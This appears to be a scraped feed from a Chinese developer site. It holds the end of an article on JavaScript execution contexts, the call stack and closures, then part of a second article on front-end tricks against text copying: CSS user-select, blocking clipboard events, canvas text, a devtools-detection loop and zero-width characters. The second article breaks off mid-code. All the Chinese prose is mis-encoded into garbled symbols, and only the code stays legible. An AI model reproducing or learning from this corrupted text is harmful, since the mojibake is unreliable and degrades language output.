<p>æ¯å½“ JS æ‰§è¡Œä¸€æ®µä»£ç ï¼Œå¼•æ“ä¼šåˆ›å»ºä¸€ä¸ª <strong>æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆExecution Contextï¼‰</strong> ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li><strong>å˜é‡ç¯å¢ƒï¼ˆVariable Environmentï¼‰</strong> ï¼šå­˜æ”¾ <code>var</code>ã€å‡½æ•°å£°æ˜ç­‰</li>
<li><strong>è¯æ³•ç¯å¢ƒï¼ˆLexical Environmentï¼‰</strong> ï¼šå­˜æ”¾ <code>let</code>ã€<code>const</code>ã€å—çº§ä½œç”¨åŸŸç­‰</li>
<li><strong>this ç»‘å®š</strong></li>
<li><strong>outer å¼•ç”¨</strong>ï¼šæŒ‡å‘å¤–å±‚ä½œç”¨åŸŸï¼ˆç”¨äºæ„å»ºä½œç”¨åŸŸé“¾ï¼‰</li>
</ul>
<p>è¿™äº›ä¸Šä¸‹æ–‡è¢«å‹å…¥ <strong>è°ƒç”¨æ ˆï¼ˆCall Stackï¼‰</strong> â€”â€” ä¸€ä¸ª LIFOï¼ˆåè¿›å…ˆå‡ºï¼‰çš„ç»“æ„ã€‚</p>
<blockquote>
<p>ğŸ“Œ <strong>ä¸ºä»€ä¹ˆç”¨æ ˆï¼Ÿ</strong><br/>
å› ä¸ºå‡½æ•°è°ƒç”¨é¢‘ç¹ï¼Œæ ˆçš„â€œå‹å…¥/å¼¹å‡ºâ€æ“ä½œæå¿«ï¼Œä¸”å†…å­˜è¿ç»­ï¼Œé€‚åˆå¿«é€Ÿåˆ‡æ¢ä¸Šä¸‹æ–‡ã€‚</p>
</blockquote>
<p>ä¸€æ—¦å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œå…¶ä¸Šä¸‹æ–‡ä»æ ˆé¡¶å¼¹å‡ºï¼Œæ ˆå†…å˜é‡ï¼ˆåŸºæœ¬ç±»å‹ï¼‰<strong>ç¬é—´é‡Šæ”¾</strong>ï¼›è€Œå †ä¸­çš„å¯¹è±¡ï¼Œåªæœ‰å½“<strong>æ²¡æœ‰ä»»ä½•å¼•ç”¨æŒ‡å‘å®ƒ</strong>æ—¶ï¼Œæ‰ä¼šè¢«åƒåœ¾å›æ”¶å™¨ï¼ˆGCï¼‰æ…¢æ…¢æ¸…ç†ã€‚</p>
<hr/>
<h2 data-id="heading-5">å››ã€é—­åŒ…ï¼šè‡ªç”±å˜é‡çš„â€œæ—¶å…‰èƒ¶å›Šâ€</h2>
<p>é—­åŒ…æ˜¯ JS æœ€å¼ºå¤§ä¹Ÿæœ€æ˜“è¯¯è§£çš„ç‰¹æ€§ä¹‹ä¸€ã€‚çœ‹ä¸‹é¢è¿™ä¸ªç»å…¸ä¾‹å­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> myName = <span class="hljs-string">"æå®¢æ—¶é—´"</span>
    <span class="hljs-keyword">let</span> test1 = <span class="hljs-number">1</span>
    <span class="hljs-keyword">const</span> test2 = <span class="hljs-number">2</span>
    <span class="hljs-keyword">var</span> innerBar = { 
        <span class="hljs-attr">setName</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">newName</span>){
            myName = newName
        },
        <span class="hljs-attr">getName</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(test1)
            <span class="hljs-keyword">return</span> myName
        }
    }
    <span class="hljs-keyword">return</span> innerBar
}
<span class="hljs-keyword">var</span> bar = <span class="hljs-title function_">foo</span>()
bar.<span class="hljs-title function_">setName</span>(<span class="hljs-string">"æå®¢é‚¦"</span>)
bar.<span class="hljs-title function_">getName</span>()
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(bar.<span class="hljs-title function_">getName</span>())
</code></pre>
<h3 data-id="heading-6">é—­åŒ…æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</h3>
<ol>
<li><strong>ç¼–è¯‘é˜¶æ®µ</strong>ï¼šV8 æ‰«æ <code>foo</code> å†…éƒ¨å‡½æ•°ï¼Œå‘ç° <code>getName</code>/<code>setName</code> å¼•ç”¨äº† <code>myName</code>ã€‚</li>
<li><strong>åˆ¤æ–­é—­åŒ…</strong>ï¼šåªè¦æœ‰å†…éƒ¨å‡½æ•°å¼•ç”¨äº†å¤–éƒ¨å˜é‡ï¼Œå°±åˆ¤å®šå­˜åœ¨é—­åŒ…ã€‚</li>
<li><strong>åˆ›å»º closure å¯¹è±¡</strong>ï¼šåœ¨<strong>å †å†…å­˜</strong>ä¸­åˆ›å»ºä¸€ä¸ª <code>closure(foo)</code> å¯¹è±¡ï¼Œä¸“é—¨ä¿å­˜è¢«å¼•ç”¨çš„è‡ªç”±å˜é‡ï¼ˆå¦‚ <code>myName</code>ï¼‰ã€‚</li>
<li><strong>å†…éƒ¨å‡½æ•°ç»‘å®š</strong>ï¼š<code>getName</code> å’Œ <code>setName</code> çš„ <code>[[Scope]]</code> æŒ‡å‘è¿™ä¸ª <code>closure(foo)</code>ã€‚</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9fa2db06f5e433984f4b768cce73953~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sf5qSw5Lid57uS5ou_6ZOB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939964&amp;x-signature=QecN7u0in2TLLZVtygwG5kGjRkw%3D" alt="d988c42838314c078c1a17b622dade56.png" loading="lazy"/></p>
<blockquote>
<p>ğŸ”¥ <strong>æ ¸å¿ƒçªç ´</strong>ï¼š<br/>
é—­åŒ…çš„æœ¬è´¨ï¼Œæ˜¯<strong>æŠŠæœ¬è¯¥éšæ ˆé”€æ¯çš„å˜é‡ï¼Œæå‡åˆ°å †ä¸­é•¿æœŸä¿å­˜</strong>ï¼Œå¹¶é€šè¿‡ä½œç”¨åŸŸé“¾ç»´æŒè®¿é—®èƒ½åŠ›ã€‚</p>
</blockquote>
<p>è¿™è§£é‡Šäº†ä¸ºä»€ä¹ˆå³ä½¿ <code>foo()</code> æ‰§è¡Œå®Œæ¯•ï¼Œè¿”å›çš„å‡½æ•°ä»èƒ½è¯»å†™ <code>myName</code> â€”â€” å®ƒä»¬å…±äº«åŒä¸€ä¸ªå †ä¸­çš„é—­åŒ…ç¯å¢ƒã€‚</p>
<hr/>
<h2 data-id="heading-7">äº”ã€å¯¹æ¯” C è¯­è¨€ï¼šJS ä¸ºä½•ä¸ç”¨æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼Ÿ</h2>
<p>çœ‹çœ‹ C ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">int main() {
  int <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  char* <span class="hljs-attr">b</span> = <span class="hljs-string">"æå®¢æ—¶é—´"</span><span class="hljs-comment">;</span>
  bool <span class="hljs-attr">c</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
  <span class="hljs-attr">c</span> = a<span class="hljs-comment">; // éšå¼è½¬æ¢ï¼ˆå±é™©ï¼ï¼‰</span>
  return 0<span class="hljs-comment">;</span>
}
</code></pre>
<p>C/C++ éœ€è¦æ‰‹åŠ¨ <code>malloc</code> / <code>free</code>ï¼Œç¨æœ‰ä¸æ…å°±ä¼šå†…å­˜æ³„æ¼æˆ–é‡æŒ‡é’ˆã€‚è€Œ JSï¼š</p>
<ul>
<li><strong>è‡ªåŠ¨åˆ†é…</strong>ï¼šå£°æ˜å˜é‡æ—¶è‡ªåŠ¨å†³å®šæ”¾æ ˆ or å †</li>
<li><strong>è‡ªåŠ¨å›æ”¶</strong>ï¼šé€šè¿‡å¼•ç”¨è®¡æ•° + æ ‡è®°æ¸…é™¤ç®—æ³•å›æ”¶æ— ç”¨å¯¹è±¡</li>
<li><strong>å¼€å‘è€…æ— æ„Ÿ</strong>ï¼šä½ åªéœ€å…³æ³¨é€»è¾‘ï¼Œå¼•æ“å¤„ç†ä¸€åˆ‡</li>
</ul>
<p>å½“ç„¶ï¼Œè¿™ä¹Ÿå¸¦æ¥æ€§èƒ½æƒè¡¡ï¼šå †æ“ä½œæ¯”æ ˆæ…¢ï¼ŒGC å¯èƒ½é€ æˆå¡é¡¿ã€‚ä½†å¯¹å¤§å¤šæ•° Web åº”ç”¨æ¥è¯´ï¼Œè¿™æ˜¯å€¼å¾—çš„æŠ½è±¡ã€‚</p>
<hr/>
<h2 data-id="heading-8">å…­ã€æ€»ç»“ï¼šä¸€å¼ å›¾çœ‹æ‡‚ JS å†…å­˜æ¨¡å‹</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02d47040f7c74dadad46116cec8e9df8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55Sf5qSw5Lid57uS5ou_6ZOB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939964&amp;x-signature=MZdTOFhSE5ymBLt%2Fl59VqPHWxeo%3D" alt="f1515078f7c243d6847e9eb9c5bef712.png" loading="lazy"/></p>
<ul>
<li><strong>æ ˆ</strong>ï¼šè½»é‡ã€å¿«é€Ÿã€è‡ªåŠ¨é‡Šæ”¾</li>
<li><strong>å †</strong>ï¼šé‡é‡ã€çµæ´»ã€GC å›æ”¶</li>
<li><strong>é—­åŒ…</strong>ï¼šé€šè¿‡å †ä¿å­˜è‡ªç”±å˜é‡ï¼Œæ‰“ç ´æ ˆçš„ç”Ÿå‘½å‘¨æœŸé™åˆ¶</li>
</ul>
<hr/>
<h2 data-id="heading-9">ä¸ƒã€ç»“è¯­</h2>
<p>ç†è§£ JavaScript çš„å†…å­˜æœºåˆ¶ï¼Œä¸ä»…èƒ½å†™å‡ºæ›´å¥å£®çš„ä»£ç ï¼Œè¿˜èƒ½åœ¨é¢è¯•ä¸­è„±é¢–è€Œå‡ºã€‚<strong>çœŸæ­£çš„é«˜æ‰‹ï¼Œæ—¢ä¼šå†™ä¸šåŠ¡ï¼Œä¹Ÿæ‡‚åº•å±‚åŸç†</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯æ€ä¹ˆé˜²æ­¢ç”¨æˆ·å¤åˆ¶ï¼Ÿè¿™10ç§æ–¹æ³•è®©ä½ çš„å†…å®¹æ›´å®‰å…¨]]></title>    <link>https://juejin.cn/post/7581727073582137395</link>    <guid>https://juejin.cn/post/7581727073582137395</guid>    <pubDate>2025-12-10T02:54:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581727073582137395" data-draft-id="7573972055269244966" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯æ€ä¹ˆé˜²æ­¢ç”¨æˆ·å¤åˆ¶ï¼Ÿè¿™10ç§æ–¹æ³•è®©ä½ çš„å†…å®¹æ›´å®‰å…¨"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T02:54:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åˆ˜å¤§å"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯æ€ä¹ˆé˜²æ­¢ç”¨æˆ·å¤åˆ¶ï¼Ÿè¿™10ç§æ–¹æ³•è®©ä½ çš„å†…å®¹æ›´å®‰å…¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åˆ˜å¤§å
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:54:37.000Z" title="Wed Dec 10 2025 02:54:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å¤§åï¼åœ¨æˆ‘ä»¬å†™å‰ç«¯çš„æ—¶å€™ï¼Œæœ‰æ—¶å€™ä¼šé‡åˆ°è¿™ç§<strong>ç¦æ­¢ç”¨æˆ·å¤æ‚ç½‘é¡µå†…å®¹</strong>çš„éœ€æ±‚ï¼Œè¿™é‡Œæ¥åˆ†äº«å‡ ç§å¸¸è§çš„æ–¹æ³•ï¼Œä½†æ˜¯è¿™äº›æ–¹æ³•ä¹Ÿä¸èƒ½å®Œå…¨é˜»æ­¢å†…å®¹è¢«å¤åˆ¶ã€‚</p>
<p>å› ä¸ºç”¨æˆ·è¿˜æ˜¯å¯ä»¥é€šè¿‡å¼€å‘è€…å·¥å…·ï¼Œæˆªå›¾æå–æ–‡å­—ç­‰ç­‰è¿™äº›æ–¹å¼æ¥è¿›è¡Œå¤åˆ¶ã€‚ä¸è¿‡æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæå‡å¤åˆ¶çš„é—¨æ§›ï¼Œé˜²æ­¢æ™®é€šç”¨æˆ·éšæ„å¤åˆ¶ã€‚</p>
<hr/>
<p>ä»¥ä¸‹æ˜¯å‡ ç§å¸¸ç”¨æ–¹æ¡ˆï¼š</p>
<h3 data-id="heading-0">1. <strong>ç¦ç”¨æ–‡æœ¬é€‰æ‹©</strong></h3>
<p>ä½¿ç”¨ CSS ç¦æ­¢ç”¨æˆ·é€‰ä¸­æ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span> {
  -webkit-user-select: none; <span class="hljs-comment">/* Safari */</span>
  -moz-user-select: none;    <span class="hljs-comment">/* Firefox */</span>
  -ms-user-select: none;     <span class="hljs-comment">/* IE/Edge */</span>
  user-select: none;         <span class="hljs-comment">/* æ ‡å‡†è¯­æ³• */</span>
}
</code></pre>
<p>ä¹Ÿå¯ä»¥é’ˆå¯¹ç‰¹å®šå…ƒç´ è®¾ç½®ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"user-select: none;"</span>&gt;</span>è¿™æ®µæ–‡å­—æ— æ³•è¢«é€‰ä¸­<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>ç”¨æˆ·ä»å¯æŸ¥çœ‹æºä»£ç æˆ–ä½¿ç”¨å…¶ä»–æ‰‹æ®µå¤åˆ¶ã€‚</p>
<hr/>
<h3 data-id="heading-1">2. <strong>ç›‘å¬å¹¶é˜»æ­¢å¤åˆ¶ã€å‰ªåˆ‡ã€ç²˜è´´äº‹ä»¶</strong></h3>
<p>é€šè¿‡ JavaScript æ‹¦æˆªç›¸å…³é”®ç›˜å’Œå‰ªè´´æ¿äº‹ä»¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'copy'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'å¤åˆ¶å·²è¢«ç¦æ­¢'</span>);
});

<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'cut'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'å‰ªåˆ‡å·²è¢«ç¦æ­¢'</span>);
});

<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'paste'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'ç²˜è´´å·²è¢«ç¦æ­¢'</span>);
});
</code></pre>
<p>ç”¨æˆ·è¿˜æ˜¯å¯ä»¥æŒ‰ä¸‹F12ç¦ç”¨ JavaScript æˆ–ç»•è¿‡äº‹ä»¶ç›‘å¬ã€‚</p>
<hr/>
<h3 data-id="heading-2">3. <strong>å°†å†…å®¹åµŒå…¥å›¾ç‰‡æˆ– Canvas</strong></h3>
<p>å°†å…³é”®å†…å®¹æ¸²æŸ“ä¸ºå›¾ç‰‡æˆ–ä½¿ç”¨ <code>&lt;canvas&gt;</code> ç»˜åˆ¶ï¼Œä½¿æ–‡æœ¬ä¸å¯ç›´æ¥é€‰ä¸­ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"text-as-image.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"ä¸å¯å¤åˆ¶çš„æ–‡å­—"</span>&gt;</span>
</code></pre>
<p>æˆ–ä½¿ç”¨ canvas åŠ¨æ€ç»˜åˆ¶ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"myCanvas"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> ctx = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'myCanvas'</span>).<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
  ctx.<span class="hljs-property">font</span> = <span class="hljs-string">'20px Arial'</span>;
  ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">'è¿™æ®µæ–‡å­—æ— æ³•å¤åˆ¶'</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä¸åˆ©äº SEOã€æ— éšœç¢è®¿é—®ï¼ˆå±å¹•é˜…è¯»å™¨æ— æ³•è¯»å–ï¼‰ï¼Œä¸”åŠ è½½æ…¢ã€‚</p>
<hr/>
<h3 data-id="heading-3">4.ç”¨æˆ·æŒ‰F12å°±å‡ºå‘debugåŠŸèƒ½</h3>
<p>å½“ç”¨æˆ·æŒ‰ä¸‹F12æ—¶ï¼Œè§¦å‘debugè°ƒè¯•ï¼Œè®©ç”¨æˆ·æ— æ³•é€‰ä¸­é¡µé¢å†…å®¹ã€‚</p>
<pre><code class="hljs language-js" lang="js">&lt;script&gt;
(<span class="hljs-keyword">function</span> <span class="hljs-title function_">antiDebug</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> devOpen = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">const</span> threshold = <span class="hljs-number">100</span>;

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> start = performance.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">debugger</span>;
    <span class="hljs-keyword">const</span> end = performance.<span class="hljs-title function_">now</span>();

    <span class="hljs-keyword">if</span> (end - start &gt; threshold) {
      <span class="hljs-keyword">if</span> (!devOpen) {
        devOpen = <span class="hljs-literal">true</span>;
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">'&lt;h2&gt;æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·ï¼Œè¯·å…³é—­åé‡è¯•ã€‚&lt;/h2&gt;'</span>;
        <span class="hljs-comment">// å¯é€‰ï¼šä¸ŠæŠ¥ç”¨æˆ·è¡Œä¸º</span>
        <span class="hljs-comment">// fetch('/log-devtools', { method: 'POST' });</span>
      }
    } <span class="hljs-keyword">else</span> {
      devOpen = <span class="hljs-literal">false</span>;
    }

    <span class="hljs-built_in">setTimeout</span>(check, <span class="hljs-number">1000</span>);
  }

  <span class="hljs-title function_">check</span>();
})();
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-4">5. åŠ¨æ€æ–‡æœ¬æ‹†åˆ†ä¸é‡ç»„</h3>
<p>å°†æ–‡æœ¬å†…å®¹æ‹†åˆ†æˆå¤šä¸ªDOMèŠ‚ç‚¹ï¼Œå¢åŠ å¤åˆ¶éš¾åº¦ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"protected-text"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- æ–‡æœ¬å°†è¢«JavaScriptæ‹†åˆ†å¹¶æ’å…¥ --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> text = <span class="hljs-string">"è¿™æ˜¯ä¸€æ®µéœ€è¦ä¿æŠ¤çš„æœºå¯†å†…å®¹ï¼Œä¸èƒ½è¢«è½»æ˜“å¤åˆ¶"</span>;
  <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'protected-text'</span>);
  
  <span class="hljs-comment">// å°†æ¯ä¸ªå­—ç¬¦ç”¨spanåŒ…è£¹</span>
  text.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">char</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'span'</span>);
    span.<span class="hljs-property">textContent</span> = char;
    span.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'inline-block'</span>; <span class="hljs-comment">// å¢åŠ é€‰æ‹©éš¾åº¦</span>
    container.<span class="hljs-title function_">appendChild</span>(span);
  });
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>è¿›é˜¶ç‰ˆ</strong>ï¼šéšæœºæ’å…¥ä¸å¯è§å­—ç¬¦æˆ–é›¶å®½å­—ç¬¦ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">obfuscateText</span>(<span class="hljs-params">text</span>) {
  <span class="hljs-keyword">const</span> zeroWidthSpace = <span class="hljs-string">'\u200B'</span>; <span class="hljs-comment">// é›¶å®½ç©ºæ ¼</span>
  <span class="hljs-keyword">return</span> text.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">char</span> =&gt;</span> 
    char + zeroWidthSpace.<span class="hljs-title function_">repeat</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">3</span>))
  ).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>);
}

<span class="hljs-keyword">const</span> originalText = <span class="hljs-string">"ä¿æŠ¤å†…å®¹"</span>;
